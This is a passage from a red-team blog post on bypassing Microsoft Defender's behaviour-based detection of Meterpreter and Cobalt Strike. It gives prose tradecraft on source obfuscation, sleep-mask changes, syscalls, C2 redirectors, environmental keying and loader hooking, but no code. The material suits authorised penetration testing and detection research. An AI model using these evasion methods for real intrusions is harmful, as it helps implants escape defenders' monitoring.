+  <li>A Memory Scan, to verify malicious content</li>
+  <li>Detection of Meterpreter in Memory and the action of killing the Process</li>
+</ul>
+
+<p>Note: This is only ONE possible way to bypass Defenders Meterpreter behaviour-based Detection. And I’m assuming, that the Microsoft Defender Team will add additional checks after the publication of this post, as this happened for some other of my Videos or Posts. So at some point you’ll need to dig into alternatives yourself. My primary goal is not to explain how to get Meterpreter to work, but to give you an understanding about what happens.</p>
+
+<p>As already mentioned in this post above, one general way to bypass Memory Scans is modification of the source code to avoid signatures in Memory. As this behaviour-based Detection - like <strong>many</strong> other <strong>C2-Payload</strong> Detections - is verified by a Memory Scan, it’s another option here to modify the source code. One automated approach for Meterpreter source code obfuscation was published <a href="https://blog.scrt.ch/2022/04/19/3432/">in this blog post</a>. We did go that route at work - with additional manual modifications - and were able to avoid this Detection with autostdapi-Loading enabled. If you want to do that, be prepared to spend some days with the Meterpreter Code base.</p>
+
+<p>The third way - Memory encryption - it not that easy to accomplish for Meterpreter, as the HTTP/HTTPS source code does not function like many other C2-Frameworks in terms of Sleeping for time-frame x before asking for commands. It’s just about throwing out many HTTP(S) requests with small delays in between. So Memory Encryption would disrupt this Process. If you want to go this route, you would therefore need to integrate a custom Sleep-function with Memory encryption in the source code yourself.</p>
+
+<h3 id="cobalt-strike-detections-and-my-personal-journey-with-them">Cobalt Strike Detections and my personal Journey with them</h3>
+
+<p>Cobalt Strike is most likely the <strong>most sigged</strong> and most <strong>in depth analysed</strong> C2-Framework out there. This is most likely due to the fact, that it was ab(used) by many different threat-actors in the wild for the last years. Not changing default settings will not be usable in the most environments, as this will instantly get detected.</p>
+
+<p>Even using a custom Packer/Loader with Syscalls for the Shellcode execution will in many environments still fail. So I’m going to explain at least the <strong>very minimum</strong> requirements and modifications you will need to do  as operator when using this Framework. I’m not a Cobalt Strike professional user in any way, it’s just one year of experience with it - reading all of the documentations and trying out different tools/setups. So I might miss some things, that more experienced Operators are using.</p>
+
+<p><ins>C2-Server/Infrastructure minimum requirements:</ins></p>
+
+<ol>
+  <li><strong>Disable</strong> staging in the Malleable profile - if it’s enabled your Implant will get burned almost instantly, as there are many Internet wide automated Scanners which download the second stage to analyze and share it.</li>
+  <li>You <strong>have to</strong> use a custom Malleable C2-Profile with many different important evasion settings to get rid of at least <em>some</em> Detections. I had good experience with <a href="https://github.com/Tylous/SourcePoint">SourcePoint</a> generated Profiles myself.</li>
+  <li>It’s <strong>nessesary</strong>  to use a redirector in front of the C2-Server. This redirector should drop/block known Sandbox analysis IP-ranges and only allow and redirect those requests, that comply with the Malleable C2 profile. Good example tools to automate this Process are <a href="https://github.com/mgeeky/RedWarden">RedWarden</a> or <a href="https://github.com/wikiZ/RedGuard">RedGuard</a>. Not using this technique will likely lead to your implant getting burned. <strong>Fingerprinting</strong> and Detection of the Cobalt Strike server <strong>after the first Connection</strong> as mentioned for example in <a href="https://www.mdsec.co.uk/2022/07/part-2-how-i-met-your-beacon-cobalt-strike/">this MDSec blog post</a> can also be avoided with it.</li>
+</ol>
+
+<p><ins>Implant minimum requirements:</ins></p>
+
+<ol>
+  <li>Use Encryption/Obfuscation and Runtime-Decryption/De-obfuscation to Pack the Shellcode. If you don’t do that, your Loader will get flagged by Signature on disk or in Memory (depending on how you load it)</li>
+  <li>Use direct or indirect Syscalls to execute CS-Shellcode or to load the artifact from Memory. Not doing that will lead to instant Detections in most environments, as the Shellcode always has the same IoCs and will get detected by AV/EDR hooks very easy.</li>
+  <li>Use <a href="https://attack.mitre.org/techniques/T1480/001/">environmental keying</a> to bypass potential Sandbox- or automated EDR Cloud-Submission-Analysis.</li>
+  <li>You <strong>have to</strong> modify the default Sleep mask template in Cobalt Strike via the Arsenal Kit. If enabled in the Malleable C2-Profile, the Beacon will encrypt both Heap and Stack Memory to hide itself from Memory Scanners <strong>after</strong> successful execution. But as this default Sleep mask source Code <strong>itself</strong> is also heavily targeted by AV/EDR signatures and will therefore also get flagged by Memory Scanners. You <strong>should not</strong> use any unmodified public Github Sleep encryption code for that, as this will also get flagged.</li>
+</ol>
+
+<p>All of these points (except the Sleep Mask modifications) can be done either by a completely custom Packer/Loader or with the Arsenal Kit, which already provides a lot of template code to start with. If you’re planning to use the Arsenal Kit you <strong>have to</strong> get familiar with C/C++ and do <strong>heavy</strong> customizations to the template code to get rid of Detections (That’s at least what other people in the community told me, which went this route). I personally always used raw-Shellcode output and my own private custom Packer/Loader to implement the things mentioned above.</p>
+
+<p>The Sleep Mask modifications also apply to raw-Shellcode output, so you’re even fine modifying that in the Arsenal Kit when using your own custom Loader. I got CS running against Defender with the mentioned modifications, however, Defender for Endpoint did still did detect many behaviours in my testings.</p>
+
+<p><ins>Note:</ins> Even if you applied all of the mentioned requirements, your implant can still get detected in mature environments. Depending on which EDR is used in your target environment, it’s just not enough. There are still some problems left:</p>
+
+<ol>
+  <li>Don’t think you won, if you got an incoming Beacon connection. In many environments I was able to get a Beacon to run, but after issuing a <strong>single</strong> command/module the implant was instantly detected and killed. As I said, CS is most probably the most sigged Framework out there, take a look at <a href="https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_CobaltStrike.yar">for example these yara rules</a> and you will see, that vendors did implement Detection rules for nearly <strong>every</strong> command/module. These behaviour-based detections made me personally using Cobalt Strike <strong>only</strong> to initiate a reverse Socks Connection and nothing more to avoid local system IoCs and do everything over the network via socks. So in many of my projects Cobalt Strike more or less became a standalone socks5 reverse proxy software.</li>
+  <li>There might be a Blue Team and/or Threat hunters in your target environment. Even simple IoCs can lead to a manual analysis/review. In that case you will need to be aware of many more deeper evasion techniques. For automated AV/EDR analysis, a simple Memory encryption might be fine, but in this case you will need to avoid many more IoC’s like RWX/RX Memory permissions, you cannot use Win32 Sleep as that’s easy to detect and many more things to mention. Take a look at <a href="https://blog.kyleavery.com/posts/avoiding-memory-scanners/">this post</a> and the linked references/tools to get an idea about the topic.</li>
+  <li>In some environments my Beacon/Process was even detected before calling back. I cannot tell what these Detections were about and I had no clue about how to bypass them to be honest.</li>
+</ol>
+
+<p>Some more experienced Cobalt Strike users hinted me to the nearly endless possibilities of User defined reflective Loaders (UDRL) such as <a href="https://github.com/SecIdiot/TitanLdr">TitanLdr</a>. Tweaking the Cobalt Strike behaviour via the Malleable Profile options is in mature environments not enough. The Core for example will always use Win32 APIs (with potential Detections) instead of direct Syscalls. Until someone integrates a Syscall option with an Update. But with UDRL’s you can also modify all of the Cobalt Strike Core behaviour by using Import Address Table Hooks. You could for example Hook <em>VirtualProtect</em> of the Core to become <em>NtProtectVirtualMemory</em>.</p>
+
+<p>So instead of using a Custom Packer/Loader or the Arsenal Kit with modifications it <em>might be</em> the stealthiest way to stick with UDRL’s due to the current limitations of the CS-Core itself.</p>
+
+<p>For me personally, this was not an option anymore. Hooking the IAT to modify a closed source softwares Core only to bypass behaviour-based Detections? At some point I decided to at least for this moment not dig deeper and deeper into Windows Internals just to get a C2-Connection with this Framework to run. After one year of having only a very few environments with no Detections and some with a reverse Socks proxy I decided to use other Frameworks. I was always fine without CS before and it will be fine in the future again.</p>
+
+<h3 id="is-all-of-this-evasion-techniques-really-needed">Is all of this evasion-techniques really needed?</h3>
+
+<p>I would like to include a fundamental question in this post. Is all of this really needed? Is it <strong>needed</strong> to use Syscalls? Is it <strong>needed</strong> to use Memory encryption? Is it <strong>needed</strong> to unhook all the things? Is it <strong>needed</strong> to bypass AMSI or ETW? Is this tool which is known malicious worth the additional evasion effort?</p>
+
+<p>The very simple answer to this from my current knowledge and point of view is - <strong>no</strong>! Why not? Well, I think the InfoSec Industry really pushed each other to more and more and new limits over all these years. But all these evasion techniques are somehow still <em>just</em> used to bypass signatures.</p>
+
+<p>If you’re using self-generated Shellcode, it’s an option to stick to Win32 APIs again. <em>WriteProcessMemory</em> or <em>CreateThread</em> will lead to Detections of the input arguments and to an analysis of the Shellcode-Entrypoint. But if that has no <em>known malicious signature</em>, it will run fine and not get blocked.</p>
+
+<p>If you’re using In-House-Tooling or heavily modified Open Source code, AMSI will never catch you because it’s searching for <em>known signatures</em>.</p>
+
+<p>If you’re using an heavily obfuscated OpenSource C2-Framework or again a self developed one - Memory Scans won’t catch you. Of course, you don’t want to give a plain C2-Stager from Memory to the Blue Team as present, so using encryption still makes sense in that case.</p>
+
+<p>This is of course a very hypothetical world. Most IT-Security Consulting companies don’t spend that much time and money into development and research which would make this conditions apply. Threat-Actors will also have a budget limit. Therefore most stick to either OpenSource tools or commercial Software, because this saves time and money.</p>
+
+<p>But from my point of view people should be aware of this fact, as for many tools heavy modifications are one-time effort. As long as you don’t publish the code. If you spend some hours into modifications for years every week, you may not need to bypass AMSI anytime anymore. If you developed an in-house-C2, you don’t <strong>nessesarily</strong> need to care about <em>some</em> evasion techniques.</p>
+
+<p>What do you think?</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>On the one hand, I wanted to use this article to give an overview of what a Packer <strong>can</strong> technically bypass and at what point the <strong>Operator</strong> has to take action <strong>himself</strong>. Some things should hopefully be clear:</p>
+
+<ul>
+  <li>The Operator should know what his Payload is doing</li>
+  <li>The Operator should know about the Indicators of Compromise (IoCs) for his Payloads</li>
+  <li>Behaviour-based Detections can only get bypassed by the Operator himself via Payload modification</li>
+</ul>
+
+<p>On the other hand I showed some examples on how to bypass behaviour-based Detections from Defender for</p>
+
+<ul>
+  <li>The Fodhelper UAC Bypass</li>
+  <li>Meterpreter</li>
+  <li>Cobalt Strike</li>
+</ul>
+
+<p>For Cobalt Strike detections in other mature environments - well at some point I stopped digging deeper as it was just too much of a BlackBox for me. I’m still excited about it’s future development and will follow all those changes. Who knows, maybe someday I’ll pick it up again.</p>
+
+<p>The post ended up with the fundamental question about if all this stuff is even needed at all. Sometimes you will not get around it because the software/tool is closed source and known malicious. I personally think, that it’s not. But this <em>just</em> depends on which Payload you’re using. With custom tools or obfuscation many evasion techniques should not be needed at all. But as custom tools or heavy modification for each tool needs a lot of effort, the alternative of more and more evasion techniques has to be accepted in many cases. At one point you just have to question yourself, if additional effort for evasion is worth getting a known malicious Payload to work. I’m curious, where this pushing will lead to in the next years. Maybe there will be a Point at some time, where people prefer more one-time-effort against a constant up-to-date evasion practice.</p>
+
+<h2 id="links--resources">Links &amp; Resources</h2>
+
+<ul>
+  <li>Yara <a href="https://github.com/Yara-Rules/rules">https://github.com/Yara-Rules/rules</a></li>
+  <li>Elastic Mimikatz Yara rule <a href="https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Hacktool_Mimikatz.yar">https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Hacktool_Mimikatz.yar</a></li>
+  <li>Entropy based Detections <a href="https://practicalsecurityanalytics.com/file-entropy/">https://practicalsecurityanalytics.com/file-entropy/</a></li>
+  <li>SleepKiller <a href="https://github.com/ZeroMemoryEx/SleepKiller">https://github.com/ZeroMemoryEx/SleepKiller</a></li>
+  <li>Fodhelper UAC Bypass <a href="https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/">https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/</a></li>
+  <li>Reflective DLL Injection <a href="https://github.com/rapid7/ReflectiveDLLInjection/tree/fac3adab1187deade60eef27be8423ee117c1e1f">https://github.com/rapid7/ReflectiveDLLInjection/tree/fac3adab1187deade60eef27be8423ee117c1e1f</a></li>
+  <li>Meterpreter stdapi <a href="https://github.com/rapid7/metasploit-Payloads/tree/master/c/meterpreter/source/extensions/stdapi">https://github.com/rapid7/metasploit-Payloads/tree/master/c/meterpreter/source/extensions/stdapi</a></li>
+  <li>Engineering antivirus evasion (Part III) <a href="https://blog.scrt.ch/2022/04/19/3432/">https://blog.scrt.ch/2022/04/19/3432/</a></li>
+  <li>Environmental Keying <a href="https://attack.mitre.org/techniques/T1480/001/">https://attack.mitre.org/techniques/T1480/001/</a></li>
+  <li>Cobalt Strike Yara rules <a href="https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_CobaltStrike.yar">https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_CobaltStrike.yar</a></li>
+  <li>Avoiding Memory Scanners <a href="https://blog.kyleavery.com/posts/avoiding-memory-scanners/">https://blog.kyleavery.com/posts/avoiding-Memory-Scanners/</a></li>
+  <li>TitanLdr <a href="https://github.com/SecIdiot/TitanLdr">https://github.com/SecIdiot/TitanLdr</a></li>
+</ul>
+
+  
+</article>
+<article>
+If you like what I'm doing consider --&gt;  <div src="https://github.com/sponsors/S3cur3Th1sSh1t/button" title="Sponsor S3cur3Th1sSh1t" height="35" width="116" style="border: 0;" data-original-tag="iframe">
+    
+  <link rel="dns-prefetch" href="https://github.githubassets.com/">
+  <link rel="dns-prefetch" href="https://avatars.githubusercontent.com/">
+  <link rel="dns-prefetch" href="https://github-cloud.s3.amazonaws.com/">
+  <link rel="dns-prefetch" href="https://user-images.githubusercontent.com/">
+  <link rel="preconnect" href="https://github.githubassets.com/" crossorigin="">
+  <link rel="preconnect" href="https://avatars.githubusercontent.com/">
+
+  
+  <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/sponsors-embed-6a38bcf4216f82d6.css">
+
+
+  
+
+  
+
+  
+  
+
+  <link rel="mask-icon" href="https://github.githubassets.com/assets/pinned-octocat-093da3e6fa40.svg" color="#000000">
+  <link rel="alternate icon" class="js-site-favicon" type="image/png" href="https://github.githubassets.com/favicons/favicon.png">
+  <link rel="icon" class="js-site-favicon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon.svg" data-base-href="https://github.githubassets.com/favicons/favicon">
+
+
+
+
+
+  <link rel="manifest" href="https://github.com/manifest.json" crossorigin="use-credentials">
+
+  
+
+  
+    <div data-turbo-body="" style="word-wrap: break-word;">
+      <div id="__primerPortalRoot__" role="region" style="z-index: 1000; position: absolute; width: 100%;" data-turbo-permanent=""></div>
+      
+  <main>
+    <a href="https://github.com/sponsors/S3cur3Th1sSh1t?o=esb" aria-label="Sponsor @S3cur3Th1sSh1t" target="_top" data-view-component="true" class="Button--secondary Button--medium Button Button--fullWidth">  <span class="Button-content">
+      <span class="Button-visual Button-leadingVisual">
+        <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-heart color-fg-sponsors">
+    <path d="m8 14.25.345.666a.75.75 0 0 1-.69 0l-.008-.004-.018-.01a7.152 7.152 0 0 1-.31-.17 22.055 22.055 0 0 1-3.434-2.414C2.045 10.731 0 8.35 0 5.5 0 2.836 2.086 1 4.25 1 5.797 1 7.153 1.802 8 3.02 8.847 1.802 10.203 1 11.75 1 13.914 1 16 2.836 16 5.5c0 2.85-2.045 5.231-3.885 6.818a22.066 22.066 0 0 1-3.744 2.584l-.018.01-.006.003h-.002ZM4.25 2.5c-1.336 0-2.75 1.164-2.75 3 0 2.15 1.58 4.144 3.365 5.682A20.58 20.58 0 0 0 8 13.393a20.58 20.58 0 0 0 3.135-2.211C12.92 9.644 14.5 7.65 14.5 5.5c0-1.836-1.414-3-2.75-3-1.373 0-2.609.986-3.029 2.456a.749.749 0 0 1-1.442 0C6.859 3.486 5.623 2.5 4.25 2.5Z"></path>
+</svg>
+      </span>
+    <span class="Button-label">Sponsor</span>
+  </span>
+</a>
+
+  </main>
+
+    </div>
+    <div id="js-global-screen-reader-notice" class="sr-only mt-n1" aria-live="polite" aria-atomic="true"></div>
+    <div id="js-global-screen-reader-notice-assertive" class="sr-only mt-n1" aria-live="assertive" aria-atomic="true"></div>
+  
+
+</div> &lt;-- or <a href="https://www.patreon.com/S3cur3Th1sSh1t">become a Patron</a> for a coffee or beer. 
+</article>
+
+  
+
+
+
+
+</body></html>
